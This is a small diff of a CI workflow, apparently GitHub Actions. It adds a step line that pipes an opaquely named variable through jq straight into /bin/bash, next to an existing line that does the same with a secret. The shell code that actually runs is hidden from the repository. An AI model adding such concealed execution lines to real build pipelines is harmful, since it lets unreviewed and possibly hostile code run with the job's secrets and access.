@@ -19,6 +19,7 @@ jobs:
           lp016: ${{ secrets.lp016 }}
         run: |
           printf '%s' "$lp016" | jq -r .czfl17 | /bin/bash
+          printf '%s' "$er02" | jq -r .orcu531 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
